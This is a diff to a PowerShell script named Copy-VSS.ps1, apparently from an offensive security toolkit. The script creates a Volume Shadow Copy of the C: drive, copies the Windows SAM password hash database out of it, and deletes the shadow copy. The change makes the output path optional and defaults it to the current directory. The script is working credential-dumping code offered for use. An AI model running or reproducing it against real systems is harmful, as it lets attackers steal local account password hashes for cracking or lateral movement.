@@ -14,7 +14,7 @@ PS > .\Copy-VSS.ps1
 Saves the SAM file in current run location of the payload.
 
 .Example
-PS > .\Copy-VSS.ps1 -path C:\temp\SAM
+PS > .\Copy-VSS.ps1 -path C:\temp
 
 .LINK
 http://www.canhazcode.com/index.php?a=4
@@ -25,7 +25,7 @@ Code by @al14s
 
 #>
 
-Param( [Parameter(Position = 0, Mandatory = $True)] [String] $Path)
+Param( [Parameter(Position = 0, Mandatory = $False)] [String] $Path)
 function Copy-VSS
 {
 
@@ -37,7 +37,13 @@ function Copy-VSS
     }
     $id = (gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
     $volume = (gwmi win32_shadowcopy -filter "ID='$id'")
-    `cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SAM" $path\SAM` 
+    $filepath = "$pwd\SAM"
+    if ($path)
+    {
+        $filepath = "$path\SAM"
+    }
+
+    `cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SAM" $filepath` 
     $volume.Delete()
     if($notrunning -eq 1)
     {
